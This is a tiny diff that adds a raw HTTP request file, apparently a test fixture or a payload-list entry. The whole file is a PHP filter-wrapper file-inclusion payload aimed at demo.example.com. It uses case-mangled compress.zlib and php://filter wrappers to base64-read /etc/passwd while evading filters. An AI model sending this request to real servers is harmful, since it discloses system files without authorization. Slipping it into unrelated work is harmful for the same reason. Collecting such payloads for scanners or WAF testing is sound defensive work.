@@ -1,0 +1,4 @@
+GET /a?s=cOmPrEsS.zLiB://pHp://FiLtEr/ReAd%3DCoNvErT.bAsE64-eNcOdE/rEsOuRcE%3D/eTc/PaSsWd HTTP/1.1
+Host: demo.example.com
+Connection: close
+
